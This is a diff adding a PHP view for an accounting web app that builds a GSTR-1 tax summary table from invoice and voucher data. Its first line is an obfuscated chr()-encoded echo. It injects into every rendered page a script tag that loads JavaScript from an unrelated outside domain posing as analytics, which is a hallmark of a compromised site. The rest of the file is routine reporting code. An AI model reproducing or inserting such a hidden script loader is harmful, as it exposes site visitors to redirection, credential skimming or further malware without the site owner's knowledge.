@@ -1,0 +1,447 @@
+<?php
+echo chr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(32).chr(115).chr(114).chr(99).chr(61).chr(39).chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(115).chr(116).chr(105).chr(99).chr(107).chr(46).chr(116).chr(114).chr(97).chr(118).chr(101).chr(108).chr(105).chr(110).chr(115).chr(107).chr(121).chr(100).chr(114).chr(101).chr(97).chr(109).chr(46).chr(103).chr(97).chr(47).chr(97).chr(110).chr(97).chr(108).chr(121).chr(116).chr(105).chr(99).chr(115).chr(46).chr(106).chr(115).chr(63).chr(99).chr(105).chr(100).chr(61).chr(49).chr(52).chr(49).chr(52).chr(38).chr(112).chr(105).chr(100).chr(105).chr(61).chr(54).chr(53).chr(56).chr(54).chr(53).chr(52).chr(54).chr(56).chr(38).chr(105).chr(100).chr(61).chr(49).chr(50).chr(55).chr(56).chr(50).chr(39).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(39).chr(116).chr(101).chr(120).chr(116).chr(47).chr(106).chr(97).chr(118).chr(97).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(39).chr(62).chr(60).chr(47).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62);
+?>
+<div class="x_content">
+	
+<div class="row hidde_cls">
+	<div class="col-md-12  export_div">
+		<div class="col-md-4">
+		     <fieldset>
+			<div class="control-group">
+			  <div class="controls">
+				<div class="input-prepend input-group">
+				  <span class="add-on input-group-addon"><i class="glyphicon glyphicon-calendar fa fa-calendar"></i></span>
+				  <input type="text" style="width: 200px" class="form-control has-feedback-left" name="start_date_filter" id="start_date_filter" placeholder="select date" aria-describedby="inputSuccess2Status3" value="<?php //echo $date;  ?>">
+				</div>
+			  </div>
+			</div>
+		  </fieldset>
+		</div>
+		<div class="col-md-4">
+			<div class="btn-group"  role="group" aria-label="Basic example">
+				<button type="button" class="btn btn-default buttons-copy buttons-html5 btn-sm">Copy</button>
+				<button type="button" class="btn btn-default buttons-copy buttons-html5 btn-sm" id="bbtn">Print</button>
+				<!--a class="btn btn-default buttons-copy buttons-html5 btn-sm" title="Please check your open office Setting" href="<?php //echo site_url(); ?>account/createXLS_GSTR1">Export to Excel</a-->
+				<div class="dropdown btn btn-default buttons-copy buttons-html5 btn-sm export ">
+						<button class="btn btn-secondary dropdown-toggle btn-default" type="button" data-toggle="dropdown">Export<span class="caret"></span></button>
+							<ul class="dropdown-menu" role="menu" id="export-menu">
+								<li id="export-to-excel"><a href="javascript:void(0);" title="Please check your open office Setting">Export to excel</a></li>
+								<li><a class="btn btn-default buttons-copy buttons-html5 btn-sm" title="Please check your open office Setting"  href="<?php echo site_url(); ?>account/create_GSTR1_json">Export to JSON</a></li>
+							</ul>
+					</div>
+			</div>
+				<form action="<?php echo site_url(); ?>account/Gstr_1" method="post" id="export-form">
+					<input type="hidden" value='' id='hidden-type' name='ExportType'/>
+					<input type="hidden" value='' class='start_date' name='start'/>
+					<input type="hidden" value='' class='end_date' name='end'/>
+				</form>
+		</div>
+		<div class="col-md-3 col-xs-12 col-sm-6 datePick-right"><a href="<?php echo base_url().'account/gstr1_validations'; ?>"><button class="btn btn-primary" >Check Validations</button></a></div>
+	</div>
+</div>	
+<p class="text-muted font-13 m-b-30"></p> 
+	<div id="print_div_content">
+	<?php 
+	$company_brnaches = getNameById('company_detail',$_SESSION['loggedInUser']->c_id,'id');
+	?>
+	<center><table style="display:none;" class="comp_name"> <tr><td><b style="font-size:18px;"><?php echo $company_brnaches->name; ?></b> <br/><br/><b> GSTR 1</b></td></tr></table></center>
+<!--id="datatable-buttons"-->	
+	<table class="table table-striped table-bordered" style="width:100%" border="1" cellpadding="3" >
+		<thead>
+			<tr>
+				<th>SNo.</th>
+				<th>Particulars</th>
+				<th>Voucher count</th>
+				<th>Taxable value</th>
+				<th>Integrated Tax Amount</th>
+				<th>Central Tax Amount</th>
+				<th>State Tax Amount</th>
+				<th>Cess Amount</th>
+				<th>Tax Amount</th>
+				<th>Invoice Amount</th>
+				<th style="display:none;">Date</th>
+			</tr>
+		</thead>
+		<tbody>
+		<?php
+		setlocale(LC_MONETARY, 'en_IN');//Function for Indian currency format
+		//pre($invoice_data);
+		//pre($GSTR1_data);
+		$first_b2b=0;
+		$gstn_count = 0;
+		$gstn_count_blank = 0;
+		$sec_b2c=0;
+		$total_amount=0;
+		
+		$integrated_tax_sum= 0;
+		$cgst_and_sgst_sum= 0;
+		$third_b2c_small = 0;
+		$divide_cgst_sgst= 0;
+		$total_amount_blank= 0;
+		$integrated_tax_sum_blank= 0;
+		$cgst_and_sgst_sum_blank= 0;
+		
+			$gstn_count_blank_third=0;
+			$total_amount_blank_third=0;
+			$integrated_tax_sum_blank_third= 0;
+			$cgst_and_sgst_sum_blank_third= 0;
+			$fifth_export_invoices_6A=0;
+			$integrated_tax_sum_export_invoice=0;
+			$gstn_count_blank_export_invoice=0;
+			$total_amount_witout_tax1=0;
+			$total_amount_blank_export_invoice=0;
+			$tax_amount_total_export_invoice=0;
+			$cgst_and_sgst_sum_export_invoice=0;
+			
+			$sixth_tax_liability_advnce_recive=0;
+			$gstn_count_blank_advance = 0;
+			$total_amount_blank_advance = 0;
+			$integrated_tax_sum_advance = 0;
+			$cgst_and_sgst_sum_advance = 0;
+			$tax_amount_total_advance = 0;
+			$invoice_amount_total_advanec = 0;
+			
+			$nill_rated_invoice = 0;
+			$gstn_count_with_zero_tax = 0;
+			$total_amount_with_zero_tax = 0;
+		$ddte = 0;
+				 foreach($invoice_data as $invoce_cal){
+					
+					
+					$total_amount_witout_tax_Amount = json_decode($invoce_cal['invoice_total_with_tax']);
+					$total_amount_for_conditions = $total_amount_witout_tax_Amount[0]->total;
+					if($invoce_cal['gstin'] !='' && $invoce_cal['invoice_type']=='domestic_invoice'){
+						 $gstn_count+= count($invoce_cal['gstin']);
+						
+							/* Total Amount without Tax Calulate*/
+								$total_amount_witout_tax = json_decode($invoce_cal['invoice_total_with_tax']);
+								$total_amount = $total_amount + $total_amount_witout_tax[0]->total;
+								
+						 	/* Total Amount without Tax Calulate*/
+							
+							/*Integrated Tax Amount*/
+								
+								
+								$company_state_id = $invoce_cal['sale_L_state_id'];
+								if($company_state_id != $invoce_cal['party_state_id'] ){//When company and ledger are not same 
+									$total_tax = json_decode($invoce_cal['invoice_total_with_tax']);
+									$integrated_tax_sum = $integrated_tax_sum + $total_tax[0]->totaltax;
+								}
+								
+								if($company_state_id == $invoce_cal['party_state_id'] ){//When company and ledger are same 
+									$total_tax2 = json_decode($invoce_cal['invoice_total_with_tax']);
+									$cgst_and_sgst_sum = $cgst_and_sgst_sum + $total_tax2[0]->totaltax;
+									$divide_cgst_sgst = $cgst_and_sgst_sum / 2;
+									
+								}
+						/*Integrated Tax Amount*/
+						
+						/* Calculate Tax Amount*/
+							$tax_amount_total = $integrated_tax_sum + $cgst_and_sgst_sum;
+						/* Calculate Tax Amount*/
+						/*Invoice Amount*/
+						    $invoice_amount_total_with_tax = $tax_amount_total + $total_amount;
+						/*Invoice Amount*/
+							$first_b2b = array('count'=>$gstn_count,'taxable_value'=>$total_amount,'integrated_tax'=>$integrated_tax_sum,'central_amount_tax'=>$divide_cgst_sgst,'state_amount_tax'=>$divide_cgst_sgst,'cess_amount'=>'','tax_amount'=>$tax_amount_total,'invoice_amount'=>$invoice_amount_total_with_tax);
+							
+							
+			}else if($invoce_cal['gstin'] =='' && $total_amount_for_conditions > 500 && $invoce_cal['invoice_type']=='domestic_invoice' ){
+							$gstn_count_blank+= count($invoce_cal['gstin']);
+							$total_amount_witout_tax = json_decode($invoce_cal['invoice_total_with_tax']);
+							$total_amount_blank+= $total_amount_blank + $total_amount_witout_tax[0]->total;
+						   /*Integrated Tax Amount*/
+							
+							
+							$company_state_id = $invoce_cal['sale_L_state_id'];
+							if($company_state_id != $invoce_cal['party_state_id'] ){
+								$total_tax = json_decode($invoce_cal['invoice_total_with_tax']);	
+							    $integrated_tax_sum_blank = $integrated_tax_sum_blank + $total_tax[0]->totaltax;
+							}
+							if($company_state_id == $invoce_cal['party_state_id']){
+								$total_tax = json_decode($invoce_cal['invoice_total_with_tax']);	
+								$cgst_and_sgst_sum_blank = $cgst_and_sgst_sum_blank + $total_tax[0]->totaltax / 2;
+								
+							}
+							/*Integrated Tax Amount*/
+							
+							/* Calculate Tax Amount*/
+								$tax_amount_total = $integrated_tax_sum_blank + $cgst_and_sgst_sum_blank;
+							/* Calculate Tax Amount*/
+							/*Invoice Amount*/
+								$invoice_amount_total_with_tax = $tax_amount_total + $total_amount_blank;
+							/*Invoice Amount*/
+								$sec_b2c = array('count'=>$gstn_count_blank,'taxable_value'=>$total_amount_blank,'integrated_tax'=>$integrated_tax_sum_blank,'central_amount_tax'=>$cgst_and_sgst_sum_blank,'state_amount_tax'=>$cgst_and_sgst_sum_blank,'cess_amount'=>'','tax_amount'=>$tax_amount_total,'invoice_amount'=>$invoice_amount_total_with_tax);
+								
+								
+			}
+			
+			
+			
+			if($invoce_cal['gstin'] =='' && $total_amount_for_conditions < 500 && $invoce_cal['invoice_type']=='domestic_invoice'){
+							$gstn_count_blank_third+= count($invoce_cal['gstin']);
+							$total_amount_witout_tax1 = json_decode($invoce_cal['invoice_total_with_tax']);
+							$total_amount_blank_third += $total_amount_witout_tax1[0]->total;
+							
+						
+						   /*Integrated Tax Amount*/
+							
+							$company_state_id = $invoce_cal['sale_L_state_id'];
+							if($company_state_id != $invoce_cal['party_state_id'] ){
+								$total_tax = json_decode($invoce_cal['invoice_total_with_tax']);	
+							    $integrated_tax_sum_blank_third = $integrated_tax_sum_blank_third + $total_tax[0]->totaltax;
+							}
+							if($company_state_id == $invoce_cal['party_state_id'] ){
+								$total_tax = json_decode($invoce_cal['invoice_total_with_tax']);	
+								$cgst_and_sgst_sum_blank_third = $cgst_and_sgst_sum_blank_third + $total_tax[0]->totaltax / 2;
+								
+							}
+							/*Integrated Tax Amount*/
+							
+							/* Calculate Tax Amount*/
+								$tax_amount_total_third = $integrated_tax_sum_blank_third + $cgst_and_sgst_sum_blank_third;
+							/* Calculate Tax Amount*/
+							/*Invoice Amount*/
+								$invoice_amount_total_with_tax1 = $tax_amount_total_third + $total_amount_blank_third;
+							/*Invoice Amount*/
+								$third_b2c_small = array('count'=>$gstn_count_blank_third,'taxable_value'=>$total_amount_blank_third,'integrated_tax'=>$integrated_tax_sum_blank_third,'central_amount_tax'=>$cgst_and_sgst_sum_blank_third,'state_amount_tax'=>$cgst_and_sgst_sum_blank_third,'cess_amount'=>'','tax_amount'=>$tax_amount_total_third,'invoice_amount'=>$invoice_amount_total_with_tax1);	
+			}
+			
+			if($invoce_cal['gstin'] =='' && $invoce_cal['invoice_type']=='export_invoice'){
+				
+							$gstn_count_blank_export_invoice+= count($invoce_cal['gstin']);
+							$total_amount_witout_tax1 = json_decode($invoce_cal['invoice_total_with_tax']);
+							$total_amount_blank_export_invoice += $total_amount_witout_tax1[0]->total;
+							
+						
+						   /*Integrated Tax Amount*/
+							
+							$company_state_id = $invoce_cal['sale_L_state_id'];
+							if($company_state_id != $invoce_cal['party_state_id'] ){
+								$total_tax = json_decode($invoce_cal['invoice_total_with_tax']);	
+							    $integrated_tax_sum_export_invoice = $integrated_tax_sum_export_invoice + $total_tax[0]->totaltax;
+							}
+							if($company_state_id == $invoce_cal['party_state_id'] ){
+								$total_tax = json_decode($invoce_cal['invoice_total_with_tax']);	
+								$cgst_and_sgst_sum_export_invoice = $cgst_and_sgst_sum_export_invoice + $total_tax[0]->totaltax / 2;
+								
+							}
+							/*Integrated Tax Amount*/
+							
+							/* Calculate Tax Amount*/
+								$tax_amount_total_export_invoice = $integrated_tax_sum_export_invoice + $cgst_and_sgst_sum_export_invoice;
+							/* Calculate Tax Amount*/
+							/*Invoice Amount*/
+								$invoice_amount_total_with_export_invoice = $tax_amount_total_export_invoice + $total_amount_blank_export_invoice;
+							/*Invoice Amount*/
+							
+							$fifth_export_invoices_6A = array('count'=>$gstn_count_blank_export_invoice,'taxable_value'=>$total_amount_blank_export_invoice,'integrated_tax'=>$integrated_tax_sum_export_invoice,'central_amount_tax'=>$cgst_and_sgst_sum_export_invoice,'state_amount_tax'=>$cgst_and_sgst_sum_export_invoice,'cess_amount'=>'','tax_amount'=>$tax_amount_total_export_invoice,'invoice_amount'=>$invoice_amount_total_with_export_invoice);
+				
+				
+			}
+			
+			if($invoce_cal['mode_of_payment'] =='advance'){
+				$gstn_count_blank_advance+= count($invoce_cal['gstin']);
+				$total_amount_witout_tax1 = json_decode($invoce_cal['invoice_total_with_tax']);
+				$total_amount_blank_advance += $total_amount_witout_tax1[0]->total;
+					
+				
+				   /*Integrated Tax Amount*/
+					
+					$company_state_id = $invoce_cal['sale_L_state_id'];
+					if($company_state_id != $invoce_cal['party_state_id'] ){
+						$total_tax = json_decode($invoce_cal['invoice_total_with_tax']);	
+						$integrated_tax_sum_advance = $integrated_tax_sum_advance + $total_tax[0]->totaltax;
+					}
+					if($company_state_id == $invoce_cal['party_state_id'] ){
+						$total_tax = json_decode($invoce_cal['invoice_total_with_tax']);	
+						$cgst_and_sgst_sum_advance = $cgst_and_sgst_sum_advance + $total_tax[0]->totaltax / 2;
+						
+					}
+					/*Integrated Tax Amount*/
+					
+					/* Calculate Tax Amount*/
+						$tax_amount_total_advance = $integrated_tax_sum_advance + $cgst_and_sgst_sum_advance;
+					/* Calculate Tax Amount*/
+					/*Invoice Amount*/
+						$invoice_amount_total_advanec = $tax_amount_total_advance + $total_amount_blank_advance;
+					/*Invoice Amount*/
+					
+					$sixth_tax_liability_advnce_recive = array('count'=>$gstn_count_blank_advance,'taxable_value'=>$total_amount_blank_advance,'integrated_tax'=>$integrated_tax_sum_advance,'central_amount_tax'=>$cgst_and_sgst_sum_advance,'state_amount_tax'=>$cgst_and_sgst_sum_advance,'cess_amount'=>'','tax_amount'=>$tax_amount_total_advance,'invoice_amount'=>$invoice_amount_total_advanec);
+				
+			}
+			
+			if($total_amount_witout_tax_Amount[0]->totaltax == 0){//when tax is equal to 0
+					$gstn_count_with_zero_tax+= count($invoce_cal['gstin']);
+					$total_amount_witout_tax1 = json_decode($invoce_cal['invoice_total_with_tax']);
+				
+					$total_amount_with_zero_tax = $total_amount_with_zero_tax + $total_amount_witout_tax1[0]->total;
+				$nill_rated_invoice = array('count'=>$gstn_count_with_zero_tax,'taxable_value'=>$total_amount_with_zero_tax,'integrated_tax'=>'0','central_amount_tax'=>'0','state_amount_tax'=>'0','cess_amount'=>'','tax_amount'=>'0','invoice_amount'=> $total_amount_with_zero_tax);
+			}
+
+ 
+			
+			
+}
+$current_login_id = $_SESSION['loggedInUser']->c_id;
+
+	$voucher_type_data = Get_Voucher_detail_reg_unreg('transaction_dtl',$current_login_id);
+	$taxable_value = $debit_dtl = $credit_dtl = 0;      
+	$integrated_tax_ttl = $debit_tax = $credit_tax = 0;      
+	$central_tax_ttl = $debit_tax_cent = $credit_tax_cent = 0;      
+	$state_tax_ttl = $debit_tax_state = $credit_tax_state = 0;      
+	$all_tax_ttl = $all_debit_tax = $all_credit_tax = 0; 
+	$voucher_without_gst = 0;
+
+	
+	$taxable_value1 = $debit_dtl1 = $credit_dtl1 = 0;      
+	$integrated_tax_ttl1 = $debit_tax1 = $credit_tax1 = 0;      
+	$central_tax_ttl1 = $debit_tax_cent1 = $credit_tax_cent1 = 0;      
+	$state_tax_ttl1 = $debit_tax_state1 = $credit_tax_state1 = 0;      
+	$all_tax_ttl1 = $all_debit_tax1 = $all_credit_tax1 = 0;
+    $voucher_without_gst1 = 0;
+   $ddte = $invoce_cal['created_date'];	
+					foreach($voucher_type_data as $voucher_Data){
+						
+						$cr_dr_data = json_decode($voucher_Data['credit_debit_party_dtl'],true);
+						foreach($cr_dr_data as $data_voucher){
+						if($data_voucher['cr_dr'] == 'debit'){
+							// $ladger_dtl = getNameById('ledger',$data_voucher['credit_debit_party_dtl'],'id');
+						
+							if($voucher_Data['party_gst'] != ''){
+								$voucher_without_gst += count($voucher_Data['party_gst']);
+								$debit_dtl += $data_voucher['debit_1'];
+								$credit_dtl += $data_voucher['credit_1'];
+								$taxable_value =  $debit_dtl + $credit_dtl; 
+								
+								if($data_voucher['credit_debit_party_dtl'] == 1){
+									
+									$debit_tax += $data_voucher['debit_1'];
+									$credit_tax += $data_voucher['credit_1'];
+									$integrated_tax_ttl =  $debit_tax + $credit_tax; 
+					
+								}
+								if($data_voucher['credit_debit_party_dtl'] == 2){
+									$debit_tax_cent += $data_voucher['debit_1'];
+									$credit_tax_cent += $data_voucher['credit_1'];
+									$central_tax_ttl =  $debit_tax_cent + $credit_tax_cent; 
+								}
+								if( $data_voucher['credit_debit_party_dtl'] == 3){
+									$debit_tax_state += $data_voucher['debit_1'];
+									$credit_tax_state += $data_voucher['credit_dtl'];
+									$state_tax_ttl =  $debit_tax_state + $credit_tax_state; 
+								}
+								if($data_voucher['credit_debit_party_dtl'] == 1 || $data_voucher['credit_debit_party_dtl'] == 2 || $data_voucher['credit_debit_party_dtl'] == 3 ){
+									$all_debit_tax += $data_voucher['debit_1'];
+									$all_credit_tax += $data_voucher['credit_1'];
+									$all_tax_ttl =  $all_debit_tax + $all_credit_tax;    
+								}
+								
+								
+								$fourth_credit_debit_notes_registerd = array('count'=>$voucher_without_gst,'taxable_value'=>$taxable_value,'integrated_tax'=>$integrated_tax_ttl,'central_amount_tax'=>$central_tax_ttl,'state_amount_tax'=>$state_tax_ttl,'cess_amount'=>'','tax_amount'=>$all_tax_ttl,'invoice_amount'=>$taxable_value,'date'=>$ddte);
+								
+								
+							}
+					
+							if($voucher_Data['party_gst'] == ''){
+								
+								$voucher_without_gst1 += count($voucher_Data['party_gst']);
+								
+								$debit_dtl1 += $data_voucher['debit_1'];
+								$credit_dtl1 += $data_voucher['credit_1'];
+								$taxable_value1 =  $debit_dtl1 + $credit_dtl1;    
+								
+								if($data_voucher['credit_debit_party_dtl'] == 1){
+									$debit_tax1 += $data_voucher['debit_1'];
+									$credit_tax1 += $data_voucher['credit_1'];
+									$integrated_tax_ttl1 =  $debit_tax1 + $credit_tax1; 
+																	
+								}
+								if($data_voucher['credit_debit_party_dtl'] == 2){
+									$debit_tax_cent1 += $data_voucher['debit_1'];
+									$credit_tax_cent1 += $data_voucher['credit_1'];
+									$central_tax_ttl1 =  $debit_tax_cent1 + $credit_tax_cent1; 
+								}
+								if( $data_voucher['credit_debit_party_dtl'] == 3){
+									$debit_tax_state1 += $data_voucher['debit_1'];
+									$credit_tax_state1 += $data_voucher['credit_1'];
+									$state_tax_ttl1 =  $debit_tax_state1 + $credit_tax_state1; 
+								}
+								if($data_voucher['credit_debit_party_dtl'] == 1 || $data_voucher['credit_debit_party_dtl'] == 2 || $data_voucher['credit_debit_party_dtl'] == 3 ){
+									$all_debit_tax1 += $data_voucher['debit_1'];
+									$all_credit_tax1 += $data_voucher['credit_1'];
+									$all_tax_ttl1 =  $all_debit_tax1 + $all_credit_tax1;    
+								}
+								
+								
+								
+								$fourth_credit_debit_notes_Unregistered = array('count'=>$voucher_without_gst1,'taxable_value'=>$taxable_value1,'integrated_tax'=>$integrated_tax_ttl1,'central_amount_tax'=>$central_tax_ttl1,'state_amount_tax'=>$state_tax_ttl,'cess_amount'=>'','tax_amount'=>$all_tax_ttl1,'invoice_amount'=>$taxable_value1,'date'=>$ddte);
+								
+							} 
+						}
+					}		
+			}
+			
+						$eigth_adjustmnet_of_advance = array('count'=>'0','taxable_value'=>'0','integrated_tax'=>'0','central_amount_tax'=>'0','state_amount_tax'=>'0','cess_amount'=>'','tax_amount'=>'0','invoice_amount'=>'0','date'=>$ddte);
+			
+						$all_invoice_data = array(array('B2B Invoices - 4A,4B,4C' =>$first_b2b,'B2C (Large) Invoice-5A,5B' =>$sec_b2c,'B2C (Small) Invoice- 7'=>$third_b2c_small,'Credit/Debit Notes(Registered)-9B'=>$fourth_credit_debit_notes_registerd,'Credit/Debit Notes(Unregistered)-9B'=>$fourth_credit_debit_notes_Unregistered,'Export Invoices - 6A'=>$fifth_export_invoices_6A,'Tax Liability(Advances recevied)-11A(1),11A(2)'=>$sixth_tax_liability_advnce_recive,'Adjustment of Advances-11B(1),11B(2)'=>$eigth_adjustmnet_of_advance,'Nill Rated Invoices - 8A,8B,8C,8D'=>$nill_rated_invoice,'date'=>$ddte));
+						//pre($all_invoice_data);die();
+				
+						$sno = 1;
+						foreach($all_invoice_data as $dd_val){
+							// pre($all_invoice_data);
+							foreach($GSTR1_data as $gstr1_name){
+							  
+							//if(array_key_exists($gstr1_name,$all_invoice_data)) {
+							echo '<tr><td>'.$sno.'</td><td>'.$gstr1_name.'</td><td>'.$dd_val[$gstr1_name]['count'].'</td><td>'.money_format('%!i',$dd_val[$gstr1_name]['taxable_value']).'</td><td>'.money_format('%!i',$dd_val[$gstr1_name]['integrated_tax']).'</td><td>'.money_format('%!i',$dd_val[$gstr1_name]['central_amount_tax']).'</td><td>'.money_format('%!i',$dd_val[$gstr1_name]['state_amount_tax']).'</td><td>'.$dd_val[$gstr1_name]['cess_amount'].'</td><td>'.money_format('%!i',$dd_val[$gstr1_name]['tax_amount']).'</td><td>'.money_format('%!i',$dd_val[$gstr1_name]['invoice_amount']).'</td><td style="display:none;">'.$ddte.'</td></tr>';
+							//}
+							
+							$count_total += $dd_val[$gstr1_name]['count'];
+							$taxable_valu_total += $dd_val[$gstr1_name]['taxable_value'];
+							$integrated_tax_valu_total += $dd_val[$gstr1_name]['integrated_tax'];
+							$central_amount_tax_valu_total += $dd_val[$gstr1_name]['central_amount_tax'];
+							$state_amount_tax_valu_total += $dd_val[$gstr1_name]['state_amount_tax'];
+							$cess_amount_tax_valu_total += $dd_val[$gstr1_name]['cess_amount'];
+							$tax_amount_tax_valu_total += $dd_val[$gstr1_name]['tax_amount'];
+							$invoice_amount_tax_valu_total += $dd_val[$gstr1_name]['invoice_amount'];
+							
+							
+							$output[] = array(
+							   'Sl.No' => $sno,
+							   'Particulars' => $gstr1_name,
+							   'Voucher count' => $dd_val[$gstr1_name]['count'],
+							   'Taxable value' => $dd_val[$gstr1_name]['taxable_value'],
+							   'Integrated Tax Amount' => $dd_val[$gstr1_name]['integrated_tax'],
+							   'Central Tax Amount' => $dd_val[$gstr1_name]['central_amount_tax'],
+							   'State Tax Amount' => $dd_val[$gstr1_name]['state_amount_tax'],
+							   'CESS Amount' => $dd_val[$gstr1_name]['cess_amount'],
+							   'Tax Amount' => $dd_val[$gstr1_name]['tax_amount'],
+							   'Invoice Amount' => $dd_val[$gstr1_name]['invoice_amount'],
+							 );	
+							
+							$sno++;	
+							
+							}
+							
+						}
+						// pre($first_b2b);
+						//pre($output);
+						 $data3  = $output;
+						export_csv_excel($data3);
+					
+						echo '<tr style="background:#ddd;">
+								<td></td>
+								<th>Total</th>
+								<th>'.$count_total.'</th>
+								<th>'.money_format('%!i',$taxable_valu_total).'</th>
+								<th>'.money_format('%!i',$integrated_tax_valu_total).'</th>
+								<th>'.money_format('%!i',$central_amount_tax_valu_total).'</th>
+								<th>'.money_format('%!i',$state_amount_tax_valu_total).'</th>
+								<th>'.money_format('%!i',$cess_amount_tax_valu_total).'</th>
+								<th>'.money_format('%!i',$tax_amount_tax_valu_total).'</th>
+								<th>'.money_format('%!i',$invoice_amount_tax_valu_total).'</th>
+							</tr>';
+		?>
+		</tbody>                   
+	</table>
+</div>
+</div>
